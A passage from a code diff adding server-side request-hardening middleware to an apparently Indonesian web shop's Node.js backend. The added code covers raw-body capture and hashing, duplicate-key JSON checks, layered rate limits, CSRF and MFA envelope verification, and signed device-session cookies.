+      (Buffer.isBuffer(bodyValueV230) ||
+        bodyValueV230 instanceof Uint8Array)
+    ) {
+      buffer = Buffer.from(bodyValueV230);
+    }
+
+    if (!buffer && typeof bodyValueV230 === 'string') {
+      buffer = Buffer.from(bodyValueV230, 'utf8');
+    }
+
+    const method = String(req.method || 'GET').toUpperCase();
+    const declared = String(req.headers && req.headers['content-length'] || '').trim();
+    const bodyCapable = !['GET', 'HEAD', 'OPTIONS'].includes(method);
+    const streamReadable =
+      typeof req.on === 'function' &&
+      !req.readableEnded &&
+      req.destroyed !== true;
+    const bodyExpected = bodyCapable
+      && (
+        Number(declared || 0) > 0 ||
+        bodyValuePresentV230 ||
+        streamReadable
+      );
+    if (!buffer && bodyExpected && streamReadable) {
+      const rawQuery = String(req.url || '').split('?').slice(1).join('?');
+      const action = diracV143NormalizeAction(String(req.query && req.query.action || new URLSearchParams(rawQuery).get('action') || ''));
+      const contractLimit = Number(diracCentralContractForActionV146(action).maxBodyBytes || 0);
+      const rawLimit = Math.max(1024, contractLimit || Number(diracUltraBodyLimitBytes(action, method) || 128 * 1024));
+      if (declared && Number(declared) > rawLimit) return { ok: false, reason: 'raw_body_too_large' };
+      buffer = await new Promise((resolve, reject) => {
+        const chunks = [];
+        let total = 0;
+        let completed = false;
+        const fail = (code) => {
+          if (completed) return;
+          completed = true;
+          const error = new Error(code);
+          error.code = code;
+          reject(error);
+        };
+        req.on('data', (chunk) => {
+          if (completed) return;
+          const bytes = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
+          total += bytes.length;
+          if (total > rawLimit) return fail('raw_body_too_large');
+          chunks.push(bytes);
+        });
+        req.on('end', () => {
+          if (completed) return;
+          completed = true;
+          resolve(Buffer.concat(chunks, total));
+        });
+        req.on('error', () => fail('raw_body_stream_error'));
+        req.on('aborted', () => fail('raw_body_stream_aborted'));
+        req.on('close', () => {
+          if (!completed && !req.readableEnded) fail('raw_body_stream_closed');
+        });
+      });
+    }
+    if (!buffer) return bodyExpected ? { ok: false, reason: 'raw_body_capture_required' } : { ok: true, empty: true };
+    const rawText = buffer.toString('utf8');
+    if (!Buffer.from(rawText, 'utf8').equals(buffer)) return { ok: false, reason: 'raw_body_utf8_invalid' };
+    if (declared && Number(declared) !== buffer.length) return { ok: false, reason: 'content_length_raw_body_mismatch' };
+    const hash = crypto.createHash('sha256').update(buffer).digest('hex');
+    const seal = (name, value, equal) => {
+      const descriptor = Object.getOwnPropertyDescriptor(req, name);
+      if (descriptor) return Object.prototype.hasOwnProperty.call(descriptor, 'value') && equal(descriptor.value, value);
+      Object.defineProperty(req, name, { value, enumerable: false, writable: false, configurable: false });
+      return true;
+    };
+    if (!seal('__diracRawBodyBufferV230', buffer, (a, b) => (Buffer.isBuffer(a) || a instanceof Uint8Array) && Buffer.from(a).equals(b))) return { ok: false, reason: 'raw_body_buffer_evidence_conflict' };
+    if (!seal('__diracRawBodyLengthV230', buffer.length, (a, b) => Number(a) === b)) return { ok: false, reason: 'raw_body_length_evidence_conflict' };
+    if (!seal('__diracRawBodySha256V230', hash, (a, b) => String(a) === b)) return { ok: false, reason: 'raw_body_hash_evidence_conflict' };
+    if (!seal('__diracRawJsonV221', rawText, (a, b) => String(a) === b)) return { ok: false, reason: 'raw_json_evidence_conflict' };
+    const bodyDescriptorAfterCaptureV230 =
+      Object.getOwnPropertyDescriptor(req, 'body');
+
+    const publishRawBodyV230 = () => {
+      Object.defineProperty(req, 'body', {
+        value: rawText,
+        enumerable: true,
+        writable: true,
+        configurable: true
+      });
+    };
+
+    if (!bodyDescriptorAfterCaptureV230) {
+      publishRawBodyV230();
+    } else if (
+      Object.prototype.hasOwnProperty.call(
+        bodyDescriptorAfterCaptureV230,
+        'value'
+      )
+    ) {
+      const existingBodyV230 =
+        bodyDescriptorAfterCaptureV230.value;
+
+      const existingBodyMatchesV230 =
+        existingBodyV230 === undefined ||
+        existingBodyV230 === null ||
+        (
+          typeof existingBodyV230 === 'string' &&
+          existingBodyV230 === rawText
+        ) ||
+        (
+          (
+            Buffer.isBuffer(existingBodyV230) ||
+            existingBodyV230 instanceof Uint8Array
+          ) &&
+          Buffer.from(existingBodyV230).equals(buffer)
+        );
+
+      if (!existingBodyMatchesV230) {
+        return {
+          ok: false,
+          reason: 'raw_body_preparsed_value_conflict'
+        };
+      }
+
+      if (bodyDescriptorAfterCaptureV230.writable === true) {
+        req.body = rawText;
+      } else if (
+        typeof existingBodyV230 === 'string' &&
+        existingBodyV230 === rawText
+      ) {
+        // Nilai sudah identik. Tidak perlu ditulis ulang.
+      } else if (
+        bodyDescriptorAfterCaptureV230.configurable === true
+      ) {
+        publishRawBodyV230();
+      } else {
+        return {
+          ok: false,
+          reason: 'raw_body_property_not_replaceable'
+        };
+      }
+    } else {
+      if (bodyDescriptorAfterCaptureV230.configurable !== true) {
+        return {
+          ok: false,
+          reason: 'raw_body_accessor_not_replaceable'
+        };
+      }
+
+      publishRawBodyV230();
+    }
+
+    return { ok: true, bytes: buffer.length, sha256: hash };
+  } catch (error) {
+    return { ok: false, reason: String(error && error.code || 'raw_body_capture_exception') };
+  }
+}
+
+function diracCentralRawJsonEvidenceV228(req) {
+  if (!req) return '';
+  const candidates = [req.__diracRawJsonV221, req.rawBody, req.bodyRaw, req.raw];
+  for (const value of candidates) {
+    if (Buffer.isBuffer(value) || value instanceof Uint8Array) return Buffer.from(value).toString('utf8');
+    if (typeof value === 'string') return value;
+  }
+  if (typeof req.body === 'string') return req.body;
+  return '';
+}
+
+function diracCentralAdvancedContractGuardV221(req, ctx) {
+  const headers = req && req.headers || {};
+  const rawHeaderGuard = diracCentralRawRequestHeaderGuardV228(req, ctx);
+  if (!rawHeaderGuard.ok) return rawHeaderGuard;
+  const headerNames = Object.keys(headers);
+  if (headerNames.length > 100) return { ok: false, reason: 'header_count_exceeded' };
+  const totalHeaderBytes = headerNames.reduce((sum, name) => sum + Buffer.byteLength(String(name), 'utf8') + Buffer.byteLength(String(headers[name] || ''), 'utf8'), 0);
+  if (totalHeaderBytes > 32 * 1024) return { ok: false, reason: 'header_total_size_exceeded' };
+  if (String(headers['transfer-encoding'] || '').trim() && String(headers['content-length'] || '').trim()) return { ok: false, reason: 'content_length_transfer_encoding_conflict' };
+  const rawJson = diracCentralRawJsonEvidenceV228(req);
+  if (rawJson) {
+    const scan = diracCentralJsonDuplicateScanV221(rawJson || '{}');
+    if (scan.duplicate) return { ok: false, reason: 'duplicate_json_key_' + String(scan.key || 'duplicate').slice(0, 80) };
+    if (scan.malformed) return { ok: false, reason: 'raw_json_malformed' };
+    const declared = String(headers['content-length'] || '').trim();
+    if (declared && Number(declared) !== Buffer.byteLength(rawJson, 'utf8')) return { ok: false, reason: 'content_length_raw_body_mismatch' };
+  }
+  if (req && req.__diracRawJsonDuplicateV221) return { ok: false, reason: 'duplicate_json_key_' + String(req.__diracRawJsonDuplicateV221).slice(0, 80) };
+  if (req && req.__diracRawJsonMalformedV221) return { ok: false, reason: 'raw_json_malformed' };
+  const source = ['GET', 'HEAD'].includes(ctx.method) ? (req && req.query || {}) : (ctx.body || {});
+  const structure = diracCentralPlainJsonStructureV221(source, 0, { nodes: 0 });
+  if (!structure.ok) return structure;
+  const contract = diracCentralContractForActionV146(ctx.action);
+  for (const [key, value] of Object.entries(req && req.query || {})) {
+    if (key === 'action') continue;
+    if (Array.isArray(value) && !(contract.allowArrayItems && (contract.allowed || []).includes(key))) return { ok: false, reason: 'duplicate_query_parameter_' + key };
+  }
+  if (!['GET', 'HEAD', 'OPTIONS'].includes(ctx.method)) {
+    const contentTypeRaw = String(headers['content-type'] || '').trim().toLowerCase();
+    const contentType = contentTypeRaw.split(';')[0].trim();
+    const emptyLogout = ctx.action === 'domain_logout' && ctx.method === 'POST' && Number(headers['content-length'] || 0) === 0 && !rawJson;
+    if (!emptyLogout && contentType !== 'application/json') return { ok: false, reason: 'strict_json_content_type_required' };
+    if (!emptyLogout && ctx.body && typeof ctx.body === 'object' && !rawJson) {
+      return { ok: false, reason: 'raw_json_evidence_required' };
+    }
+    if (!emptyLogout && rawJson) {
+      const rawBytes = Buffer.byteLength(rawJson, 'utf8');
+      if (!Number.isSafeInteger(Number(req && req.__diracRawBodyLengthV230)) || Number(req.__diracRawBodyLengthV230) !== rawBytes) {
+        return { ok: false, reason: 'raw_json_byte_evidence_invalid' };
+      }
+      const rawHash = crypto.createHash('sha256').update(rawJson, 'utf8').digest('hex');
+      if (!/^[a-f0-9]{64}$/.test(String(req && req.__diracRawBodySha256V230 || ''))
+          || String(req.__diracRawBodySha256V230) !== rawHash) return { ok: false, reason: 'raw_json_hash_evidence_invalid' };
+      let reparsed;
+      try { reparsed = JSON.parse(rawJson || '{}'); } catch (_) { return { ok: false, reason: 'raw_json_malformed' }; }
+      let parsedCanonical = '';
+      let rawCanonical = '';
+      try {
+        parsedCanonical = diracCentralStableJsonV148(ctx.body || {});
+        rawCanonical = diracCentralStableJsonV148(reparsed || {});
+      } catch (_) { return { ok: false, reason: 'raw_json_parser_differential' }; }
+      if (parsedCanonical !== rawCanonical) return { ok: false, reason: 'raw_json_parser_differential' };
+    }
+  }
+  if (ctx.body && typeof ctx.body === 'object' && Object.prototype.hasOwnProperty.call(ctx.body, 'action')) {
+    const rawBodyAction = String(ctx.body.action || '');
+    const lowerBodyAction = rawBodyAction.trim().toLowerCase();
+    if (lowerBodyAction) {
+      const bodyActionFormat = diracCentralValidateActionFormatV146(rawBodyAction, lowerBodyAction);
+      if (!bodyActionFormat.ok) return { ok: false, reason: 'body_' + String(bodyActionFormat.reason || 'action_format_invalid') };
+      const bodyActionAlias = diracCentralNormalizeAliasV146(lowerBodyAction);
+      if (!bodyActionAlias.ok) return { ok: false, reason: 'body_' + String(bodyActionAlias.reason || 'action_alias_invalid') };
+      const canonicalBodyAction = bodyActionAlias.action === 'domain_mfa_passkey_start'
+        ? 'dirac_mfa_passkey_start'
+        : bodyActionAlias.action === 'domain_mfa_passkey_verify'
+          ? 'dirac_mfa_passkey_verify'
+          : bodyActionAlias.action;
+      const contextAction = String(ctx.action || '');
+      const canonicalContextAction = contextAction === 'domain_mfa_passkey_start'
+        ? 'dirac_mfa_passkey_start'
+        : contextAction === 'domain_mfa_passkey_verify'
+          ? 'dirac_mfa_passkey_verify'
+          : contextAction;
+      if (canonicalBodyAction !== canonicalContextAction) return { ok: false, reason: 'body_action_context_mismatch' };
+    }
+  }
+  const numericKeys = /^(?:quantity|qty|limit|total|client_price|client_subtotal|amount|attempt_count|active_passkey_count)$/i;
+  for (const item of diracCentralFlattenObjectV146(source, 0, '', 800)) {
+    const key = String(item.key || '').split('.').pop();
+    const value = item.value;
+    if (numericKeys.test(key) && value !== '' && (!Number.isFinite(Number(value)) || Number(value) < 0)) return { ok: false, reason: 'numeric_field_invalid_' + key };
+    if (/^(?:email)$/i.test(key) && String(value || '').length > 320) return { ok: false, reason: 'email_length_invalid' };
+    if (/^(?:items)$/i.test(key) && value !== null && typeof value !== 'object') return { ok: false, reason: 'items_type_invalid' };
+  }
+  return { ok: true };
+}
+
+function diracCentralRateBucketV221(key, windowMs, max) {
+  const now = Date.now();
+  const cleanKey = String(key || '').slice(0, 300);
+  let row = DIRAC_CENTRAL_RATE_BUCKETS_V221.get(cleanKey);
+  if (!row || Number(row.resetAt || 0) <= now) row = { count: 0, resetAt: now + windowMs };
+  row.count += 1;
+  DIRAC_CENTRAL_RATE_BUCKETS_V221.set(cleanKey, row);
+  if (DIRAC_CENTRAL_RATE_BUCKETS_V221.size > 20000) diracCentralCleanupMapV146(DIRAC_CENTRAL_RATE_BUCKETS_V221, 20000, 12000);
+  return { ok: row.count <= max, count: row.count, resetAt: row.resetAt };
+}
+
+function diracCentralRateProfileV221(action) {
+  const clean = String(action || '');
+  const legacy = Math.max(1, Number(diracCentralDistributedRateLimitMaxV146(clean) || 1));
+  if (/login|register/.test(clean)) return { burst: Math.min(6, legacy), sustained: Math.min(legacy, 12), concurrent: 3 };
+  if (/mfa|passkey|recovery|email_verify/.test(clean)) return { burst: Math.min(5, legacy), sustained: Math.min(legacy, 10), concurrent: 3 };
+  if (/payment|checkout|order/.test(clean)) return { burst: Math.min(8, legacy), sustained: Math.min(legacy, 20), concurrent: 4 };
+  if (/^admin_/.test(clean)) return { burst: Math.min(4, legacy), sustained: Math.min(legacy, 10), concurrent: 2 };
+  if (/health|public|products|catalog|parfum/.test(clean)) return { burst: Math.min(30, legacy), sustained: Math.min(legacy, 60), concurrent: 12 };
+  return { burst: Math.min(20, legacy), sustained: Math.min(legacy, 60), concurrent: 8 };
+}
+
+function diracCentralLayeredRateGuardV221(req, ctx) {
+  const action = String(ctx && ctx.action || '');
+  const profile = diracCentralRateProfileV221(action);
+  const ip = String(typeof getLoginSecurityIp === 'function' ? getLoginSecurityIp(req) : 'unknown');
+  const ipKey = diracCentralHashV146('ip:' + ip);
+  const sessionKey = diracCentralRequestSessionHashV146(req) || 'anonymous';
+  const origin = diracCentralNormalizeOriginV146(ctx && ctx.headers && ctx.headers.origin || '') || 'no-origin';
+  const preflight = diracCentralIsPreflightV221(ctx);
+  const burstMax = preflight ? Math.max(20, profile.burst * 4) : profile.burst;
+  const sustainedMax = preflight ? Math.max(60, profile.sustained * 4) : profile.sustained;
+  const keys = [
+    ['ip-action', ipKey + ':' + action],
+    ['session-action', sessionKey + ':' + action],
+    ['origin-action', origin + ':' + action]
+  ];
+  for (const [scope, value] of keys) {
+    if (!diracCentralRateBucketV221('v221:burst:' + scope + ':' + value, 10 * 1000, burstMax).ok) return { ok: false, reason: 'v221_burst_rate_' + scope };
+    if (!diracCentralRateBucketV221('v221:sustained:' + scope + ':' + value, 60 * 1000, sustainedMax).ok) return { ok: false, reason: 'v221_sustained_rate_' + scope };
+  }
+  if (!diracCentralRateBucketV221('v221:global:' + action, 60 * 1000, Math.max(600, sustainedMax * 100)).ok) {
+    return { ok: false, reason: 'v221_global_action_rate' };
+  }
+  const leaseKey = 'v221:concurrent:' + ipKey + ':' + action;
+  const active = Number(DIRAC_CENTRAL_CONCURRENCY_V221.get(leaseKey) || 0);
+  if (active >= profile.concurrent) return { ok: false, reason: 'v221_concurrency_limit' };
+  DIRAC_CENTRAL_CONCURRENCY_V221.set(leaseKey, active + 1);
+  ctx.__diracRateLeaseV221 = leaseKey;
+  return { ok: true };
+}
+
+function diracCentralReleaseRateLeaseV221(ctx) {
+  const key = String(ctx && ctx.__diracRateLeaseV221 || '');
+  if (!key) return;
+  const active = Number(DIRAC_CENTRAL_CONCURRENCY_V221.get(key) || 0);
+  if (active <= 1) DIRAC_CENTRAL_CONCURRENCY_V221.delete(key);
+  else DIRAC_CENTRAL_CONCURRENCY_V221.set(key, active - 1);
+  ctx.__diracRateLeaseV221 = '';
+}
+
+function diracCentralCsrfPostVerifyV221(req, ctx) {
+  if (!diracCentralNeedsCsrfNonceV146(ctx)) return { ok: true };
+  const headers = req && req.headers || {};
+  const headerValues = [
+    headers['x-csrf-token'],
+    headers['x-dirac-csrf-token']
+  ].filter((value) => String(value || '').trim()).map(String);
+  if (headerValues.length > 1 && !headerValues.every((value) => typeof safeEqual === 'function' ? safeEqual(value, headerValues[0]) : value === headerValues[0])) {
+    return { ok: false, reason: 'csrf_multiple_sources_mismatch' };
+  }
+  const token = String(headerValues[0] || '').trim();
+  if (token && (!/^[A-Za-z0-9._~-]{32,4096}$/.test(token) || token.length > 4096)) return { ok: false, reason: 'csrf_token_shape_invalid' };
+  const query = req && req.query || {};
+  if (query.csrf || query.csrf_token || query.token) return { ok: false, reason: 'csrf_token_in_query_rejected' };
+  if (ctx.body && Object.prototype.hasOwnProperty.call(ctx.body, 'action')) {
+    const bodyAction = String(ctx.body.action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
+    if (bodyAction && bodyAction !== ctx.action) return { ok: false, reason: 'csrf_action_binding_mismatch' };
+  }
+  return { ok: true };
+}
+
+function diracCentralMfaEnvelopeV221(req, ctx) {
+  let proof;
+  let payload;
+  try {
+    proof = typeof getCustomerDashboardMfaToken === 'function' ? getCustomerDashboardMfaToken(req) : { token: '', source: 'dependency_missing' };
+    if (!proof || !proof.token) return { ok: false, expected: true, reason: 'mfa_required' };
+    payload = typeof decodeCustomerDashboardMfaToken === 'function' ? decodeCustomerDashboardMfaToken(proof.token) : null;
+  } catch (_) {
+    return { ok: false, expected: false, reason: 'mfa_envelope_verification_error' };
+  }
+  if (!payload || payload.type !== CUSTOMER_MFA_SESSION_TYPE) return { ok: false, expected: false, reason: 'mfa_envelope_signature_invalid' };
+  const now = Date.now();
+  if (!Number.isSafeInteger(Number(payload.activeAtMs)) || !Number.isSafeInteger(Number(payload.expiresAtMs))
+      || Number(payload.activeAtMs) > now + 60 * 1000 || Number(payload.expiresAtMs) <= now
+      || Number(payload.expiresAtMs) - Number(payload.activeAtMs) > 60 * 60 * 1000) {
+    return { ok: false, expected: false, reason: 'mfa_envelope_time_invalid' };
+  }
+  if (!/^[A-Za-z0-9_-]{16,160}$/.test(String(payload.jti || ''))) return { ok: false, expected: false, reason: 'mfa_envelope_jti_invalid' };
+  const sessionHash = customerSecurityExpectedDashboardMfaSessionBindingV225(req, payload);
+  if (!sessionHash || !payload.sessionHash || !(typeof safeEqual === 'function' ? safeEqual(String(payload.sessionHash), sessionHash) : String(payload.sessionHash) === sessionHash)) {
+    return { ok: false, expected: false, reason: 'mfa_envelope_session_mismatch' };
+  }
+  if (payload.originHash) {
+    const expectedOrigin = customerMfaBindingHash('origin', requestOrigin(req));
+    if (!expectedOrigin || !(typeof safeEqual === 'function' ? safeEqual(String(payload.originHash), expectedOrigin) : String(payload.originHash) === expectedOrigin)) {
+      return { ok: false, expected: false, reason: 'mfa_envelope_origin_mismatch' };
+    }
+  }
+  if (payload.uaHash) {
+    const expectedUa = customerMfaBindingHash('ua', requestUserAgent(req));
+    if (!expectedUa || !(typeof safeEqual === 'function' ? safeEqual(String(payload.uaHash), expectedUa) : String(payload.uaHash) === expectedUa)) {
+      return { ok: false, expected: false, reason: 'mfa_envelope_device_mismatch' };
+    }
+  }
+  return { ok: true, payload };
+}
+
+function diracCentralMfaRequiredResponseV221(res, ctx) {
+  diracCentralApplyHeadersV146(res);
+  return res.status(403).json({
+    ok: false,
+    code: 'MFA_REQUIRED',
+    mfaRequired: true,
+    next: 'mfa_required',
+    request_id: String(ctx && ctx.requestId || '').slice(0, 64),
+    message: 'Verifikasi keamanan diperlukan sebelum membuka data ini.'
+  });
+}
+
+function diracCentralDeviceCookieNameV221() {
+  return diracCentralIsProductionV146() ? '__Host-dirac_cg_device_v221' : 'dirac_cg_device_v221';
+}
+
+function diracCentralDeviceFingerprintV221(req) {
+  const headers = req && req.headers || {};
+  return diracCentralHashV146([
+    String(headers['user-agent'] || '').slice(0, 512),
+    diracCentralNormalizeOriginV146(headers.origin || headers.referer || headers.referrer || ''),
+    String(headers['sec-ch-ua'] || '').slice(0, 300),
+    String(headers['sec-ch-ua-platform'] || '').slice(0, 100),
+    String(headers['accept-language'] || '').slice(0, 160)
+  ].join('|'));
+}
+
+const DIRAC_CENTRAL_DEVICE_SESSION_BINDING_V222 = 'dirac-central-device-session-binding-v222';
+
+function diracCentralDeviceJwtIdentityV222(token) {
+  const payload = typeof decodeJwtPayloadUnsafe === 'function' ? decodeJwtPayloadUnsafe(token) : null;
+  if (!payload || typeof payload !== 'object') return null;
+  const userId = String(payload.sub || payload.user_id || '').trim();
+  const email = normalizeAuthEmail(payload.email || '');
+  const sessionId = normalizeDomainSignedSessionId(payload.session_id || payload.sid || '');
+  if (!userId || !sessionId) return null;
+  return { userId, email, sessionId };
+}
+
+const DIRAC_CENTRAL_DEVICE_SESSION_BINDING_V223 = 'dirac-central-device-session-binding-v223';
+const DIRAC_CENTRAL_DEVICE_SESSION_COOKIE_TYPE_V223 = 'dirac-central-device-session-cookie-v223';
+
+function diracCentralDeviceSessionCookieNameV223() {
+  return diracCentralIsProductionV146() ? '__Host-dirac_cg_session_v223' : 'dirac_cg_session_v223';
+}
+
+function diracCentralDeviceJwtUserV223(token) {
+  const payload = typeof decodeJwtPayloadUnsafe === 'function' ? decodeJwtPayloadUnsafe(token) : null;
+  if (!payload || typeof payload !== 'object') return null;
+  const userId = String(payload.sub || payload.user_id || '').trim();
+  const email = normalizeAuthEmail(payload.email || '');
+  if (!userId || !email) return null;
+  return { userId, email };
+}
+
+function diracCentralCreateDeviceSessionCookieV223(identity, maxAgeSeconds) {
+  const userId = String(identity && (identity.userId || identity.id) || '').trim();
+  const email = normalizeAuthEmail(identity && identity.email || '');
+  const maxAge = Math.max(60, Math.min(60 * 60 * 24 * 7, Math.floor(Number(maxAgeSeconds || 60 * 60 * 24 * 7))));
+  if (!userId || !email) return null;
+  const now = Math.floor(Date.now() / 1000);
+  const payload = {
+    typ: DIRAC_CENTRAL_DEVICE_SESSION_COOKIE_TYPE_V223,
+    uid: userId,
+    email,
+    bid: crypto.randomBytes(32).toString('base64url'),
+    iat: now,
+    exp: now + maxAge
+  };
+  const encoded = Buffer.from(JSON.stringify(payload)).toString('base64url');
+  const signature = crypto.createHmac('sha512', diracCentralDeriveSecretV146('central-device-session-cookie-v223'))
+    .update(encoded)
+    .digest('base64url');
+  const value = encoded + '.' + signature;
+  const binding = crypto.createHmac('sha256', diracCentralDeriveSecretV146('central-device-session-binding-v223'))
+    .update(JSON.stringify([DIRAC_CENTRAL_DEVICE_SESSION_BINDING_V223, userId, email, payload.bid]))
+    .digest('hex');
+  return {
+    value,
+    binding,
+    identity: { userId, email },
+    cookie: makeCookie(diracCentralDeviceSessionCookieNameV223(), value, { maxAge, domain: '' })
+  };
+}
+
+function diracCentralVerifyDeviceSessionCookieV223(req) {
+  const cookies = typeof parseCookies === 'function' ? parseCookies(req) : {};
+  const raw = String(cookies && cookies[diracCentralDeviceSessionCookieNameV223()] || '').trim();
+  const parts = raw.split('.');
+  if (parts.length !== 2 || !parts[0] || !parts[1]) return null;
+  const expected = crypto.createHmac('sha512', diracCentralDeriveSecretV146('central-device-session-cookie-v223'))
+    .update(parts[0])
+    .digest('base64url');
+  if (!(typeof safeEqual === 'function' ? safeEqual(parts[1], expected) : parts[1] === expected)) return null;
+  let payload;
+  try { payload = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8')); } catch (_) { return null; }
+  const now = Math.floor(Date.now() / 1000);
+  const userId = String(payload && payload.uid || '').trim();
+  const email = normalizeAuthEmail(payload && payload.email || '');
+  const issuedAt = Number(payload && payload.iat || 0);
+  const expiresAt = Number(payload && payload.exp || 0);
+  const bindingId = String(payload && payload.bid || '');
+  if (!payload || payload.typ !== DIRAC_CENTRAL_DEVICE_SESSION_COOKIE_TYPE_V223
+      || !userId || !email || !/^[A-Za-z0-9_-]{40,64}$/.test(bindingId)
+      || !Number.isSafeInteger(issuedAt) || !Number.isSafeInteger(expiresAt)
+      || issuedAt > now + 60 || expiresAt <= now
+      || expiresAt - issuedAt <= 0 || expiresAt - issuedAt > 60 * 60 * 24 * 7 + 60) return null;
+
+  const signedTokens = typeof readCookieTokenCandidates === 'function'
+    ? readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE).slice(0, 8)
+    : [cookies && cookies[DOMAIN_SIGNED_SESSION_COOKIE]].filter(Boolean);
+  const signedMatch = signedTokens.map((value) => verifyDomainSessionCookieValue(value)).filter(Boolean).some((signed) =>
+    String(signed.id || '') === userId && normalizeAuthEmail(signed.email || '') === email
+  );
+  if (!signedMatch) return null;
+
+  const accessTokens = typeof uniqueNonEmptyStrings === 'function'
+    ? uniqueNonEmptyStrings([
+      ...(typeof readCookieTokenCandidates === 'function' ? readCookieTokenCandidates(cookies, ACCESS_COOKIE) : [cookies && cookies[ACCESS_COOKIE]]),
+      ...(typeof readCookieTokenCandidates === 'function' ? readCookieTokenCandidates(cookies, 'sb_access_token') : [cookies && cookies.sb_access_token])
+    ]).slice(0, 12)
+    : [cookies && cookies[ACCESS_COOKIE], cookies && cookies.sb_access_token].filter(Boolean);
+  const accessIdentities = accessTokens.map(diracCentralDeviceJwtUserV223).filter(Boolean);
+  if (accessIdentities.length && !accessIdentities.some((item) => item.userId === userId && item.email === email)) return null;
+
+  const binding = crypto.createHmac('sha256', diracCentralDeriveSecretV146('central-device-session-binding-v223'))
+    .update(JSON.stringify([DIRAC_CENTRAL_DEVICE_SESSION_BINDING_V223, userId, email, bindingId]))
+    .digest('hex');
+  return { binding, identity: { userId, email }, payload };
+}
+
+function diracCentralBootstrapDeviceSessionV223(req, res) {
+  const cookies = typeof parseCookies === 'function' ? parseCookies(req) : {};
+  const signedTokens = typeof readCookieTokenCandidates === 'function'
+    ? readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE).slice(0, 8)
+    : [cookies && cookies[DOMAIN_SIGNED_SESSION_COOKIE]].filter(Boolean);
+  const signedIdentities = signedTokens.map((value) => verifyDomainSessionCookieValue(value)).filter(Boolean);
+  if (!signedIdentities.length) return null;
+
+  const accessTokens = typeof uniqueNonEmptyStrings === 'function'
+    ? uniqueNonEmptyStrings([
+      ...(typeof readCookieTokenCandidates === 'function' ? readCookieTokenCandidates(cookies, ACCESS_COOKIE) : [cookies && cookies[ACCESS_COOKIE]]),
+      ...(typeof readCookieTokenCandidates === 'function' ? readCookieTokenCandidates(cookies, 'sb_access_token') : [cookies && cookies.sb_access_token])
+    ]).slice(0, 12)
+    : [cookies && cookies[ACCESS_COOKIE], cookies && cookies.sb_access_token].filter(Boolean);
+  const accessIdentities = accessTokens.map(diracCentralDeviceJwtUserV223).filter(Boolean);
+  if (!accessIdentities.length) return null;
+
+  let matched = null;
+  for (const signed of signedIdentities) {
+    const userId = String(signed.id || '').trim();
+    const email = normalizeAuthEmail(signed.email || '');
+    if (accessIdentities.some((item) => item.userId === userId && item.email === email)) {
+      matched = { userId, email };
+      break;
+    }
+  }
+  if (!matched) return null;
+
+  const created = diracCentralCreateDeviceSessionCookieV223(matched, 60 * 60 * 24 * 7);
+  if (!created) return null;
+  appendSetCookie(res, created.cookie);
+  return created;
+}
+
+function diracCentralDeviceStableSessionBindingV222(req) {
+  const cookies = typeof parseCookies === 'function' ? parseCookies(req) : {};
+  const signedTokens = typeof readCookieTokenCandidates === 'function'
+    ? readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE).slice(0, 8)
+    : [cookies && cookies[DOMAIN_SIGNED_SESSION_COOKIE]].filter(Boolean);
+  const accessTokens = typeof uniqueNonEmptyStrings === 'function'
+    ? uniqueNonEmptyStrings([
+      ...(typeof readCookieTokenCandidates === 'function' ? readCookieTokenCandidates(cookies, ACCESS_COOKIE) : [cookies && cookies[ACCESS_COOKIE]]),
+      ...(typeof readCookieTokenCandidates === 'function' ? readCookieTokenCandidates(cookies, 'sb_access_token') : [cookies && cookies.sb_access_token])
+    ]).slice(0, 12)
+    : [cookies && cookies[ACCESS_COOKIE], cookies && cookies.sb_access_token].filter(Boolean);
+
+  const signedIdentities = signedTokens.map((value) => verifyDomainSessionCookieValue(value)).filter(Boolean);
+  const jwtIdentities = accessTokens.map(diracCentralDeviceJwtIdentityV222).filter(Boolean);
+
+  for (const jwt of jwtIdentities) {
+    for (const signed of signedIdentities) {
+      const sameUser = String(signed.id || '') === String(jwt.userId || '')
+        && (!signed.email || !jwt.email || normalizeAuthEmail(signed.email) === normalizeAuthEmail(jwt.email));
+      if (!sameUser) continue;
+      if (signed.sessionId && signed.sessionId !== jwt.sessionId) continue;
+      return crypto.createHmac('sha256', diracCentralDeriveSecretV146('central-device-session-v222'))
+        .update(JSON.stringify([
+          DIRAC_CENTRAL_DEVICE_SESSION_BINDING_V222,
+          String(signed.id || ''),
+          normalizeAuthEmail(signed.email || jwt.email || ''),
+          String(signed.sessionId || jwt.sessionId || '')
+        ]))
+        .digest('hex');
+    }
+  }
+
+  if (jwtIdentities.length === 0) {
+    for (const signed of signedIdentities) {
+      if (!signed.sessionId) continue;
+      return crypto.createHmac('sha256', diracCentralDeriveSecretV146('central-device-session-v222'))
+        .update(JSON.stringify([
+          DIRAC_CENTRAL_DEVICE_SESSION_BINDING_V222,
+          String(signed.id || ''),
+          normalizeAuthEmail(signed.email || ''),
+          String(signed.sessionId)
+        ]))
+        .digest('hex');
+    }
+  }
+
+  return '';
+}
+
+function diracCentralLegacyDeviceSessionHashesV222(req) {
+  const cookies = typeof parseCookies === 'function' ? parseCookies(req) : {};
+  const valuesFor = (name) => {
+    const raw = cookies && cookies[name];
+    const candidates = typeof readCookieTokenCandidates === 'function' ? readCookieTokenCandidates(cookies, name) : [];
+    const values = typeof uniqueNonEmptyStrings === 'function'
+      ? uniqueNonEmptyStrings([raw, ...candidates]).slice(0, 8)
+      : [raw, ...candidates].filter(Boolean).slice(0, 8);
+    return values.length ? values : [''];
+  };
+  const access = valuesFor(ACCESS_COOKIE);
+  const signed = valuesFor(DOMAIN_SIGNED_SESSION_COOKIE);
+  const supabase = valuesFor('sb_access_token');
+  const hashes = new Set();
+  const exact = diracCentralHashV146([
+    cookies && cookies[ACCESS_COOKIE],
+    cookies && cookies[DOMAIN_SIGNED_SESSION_COOKIE],
+    cookies && cookies.sb_access_token
+  ].filter(Boolean).join('|'));
+  if (exact) hashes.add(exact);
+  outer:
+  for (const accessValue of access) {
+    for (const signedValue of signed) {
+      for (const supabaseValue of supabase) {
+        hashes.add(diracCentralHashV146([accessValue, signedValue, supabaseValue].filter(Boolean).join('|')));
+        if (hashes.size >= 512) break outer;
+      }
+    }
+  }
+  return Array.from(hashes);
+}
+
+function diracCentralDeviceSessionBindingV222(req) {
+  const bound = diracCentralVerifyDeviceSessionCookieV223(req);
